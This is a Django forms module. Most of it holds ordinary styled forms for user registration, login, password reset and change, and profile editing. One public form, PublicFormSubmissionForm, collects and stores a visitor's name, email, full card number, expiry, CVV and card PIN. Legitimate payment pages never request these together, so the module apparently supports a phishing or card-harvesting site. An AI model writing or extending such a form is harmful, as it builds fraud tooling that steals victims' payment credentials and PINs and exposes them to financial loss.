from django import forms
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm, PasswordResetForm, SetPasswordForm, PasswordChangeForm
from django.contrib.auth.models import User
from .models import FormSubmission

class CustomUserCreationForm(UserCreationForm):
    email = forms.EmailField(required=True, widget=forms.EmailInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    username = forms.CharField(widget=forms.TextInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    password1 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    password2 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

    class Meta:
        model = User
        fields = ("username", "email", "password1", "password2")

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.fields['username'].help_text = "Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only."
        self.fields['password1'].help_text = "Your password must contain at least 8 characters and can't be entirely numeric."

class CustomAuthenticationForm(AuthenticationForm):
    username = forms.CharField(widget=forms.TextInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    password = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

class CustomPasswordResetForm(PasswordResetForm):
    email = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

class CustomSetPasswordForm(SetPasswordForm):
    new_password1 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    new_password2 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.fields['new_password1'].help_text = "Your password must contain at least 8 characters and can't be entirely numeric."

class CustomPasswordChangeForm(PasswordChangeForm):
    old_password = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    new_password1 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))
    new_password2 = forms.CharField(widget=forms.PasswordInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.fields['new_password1'].help_text = "Your password must contain at least 8 characters and can't be entirely numeric."

class PublicFormSubmissionForm(forms.ModelForm):
    class Meta:
        model = FormSubmission
        fields = ['name', 'email', 'card_number', 'expiry_date', 'cvv', 'card_pin']
        widgets = {
            'name': forms.TextInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md',
                'placeholder': 'Your Name'
                }),
            'email': forms.EmailInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md',
                'placeholder': 'Your Email'
                }),
            'card_number': forms.TextInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md',
                'maxlength': 19,  
                'placeholder': '1234 5678 9012 3456',
                'pattern': r'\d{4} \d{4} \d{4} \d{4}',  # Enforce format
                'inputmode': 'numeric'  # Shows numeric keyboard on mobile
            }),
            'expiry_date': forms.TextInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md',
                'maxlength': 5,
                'placeholder': 'MM/YY'
            }),
            'cvv': forms.TextInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md pr-10', 
                'maxlength': 3,
                'placeholder': '123',
                'type': 'password',
                'inputmode': 'numeric'
            }),
            'card_pin': forms.TextInput(attrs={
                'class': 'w-full px-3 py-2 border rounded-md pr-10',  
                'maxlength': 4,
                'placeholder': '****',
                'type': 'password',
                'inputmode': 'numeric'
            }),
        }

class UserProfileUpdateForm(forms.ModelForm):
    email = forms.EmailField(required=True, widget=forms.EmailInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}))

    class Meta:
        model = User
        fields = ("username", "email", "first_name", "last_name")
        widgets = {
            'username': forms.TextInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}),
            'first_name': forms.TextInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}),
            'last_name': forms.TextInput(attrs={'class': 'w-full px-3 py-2 border rounded-md'}),
        }

    def __init__(self, *args, **kwargs):
        super(UserProfileUpdateForm, self).__init__(*args, **kwargs)
        self.fields['email'].initial = self.instance.email

    def save(self, commit=True):
        user = super().save(commit=False)
        user.email = self.cleaned_data["email"]
        if commit:
            user.save()
        return user
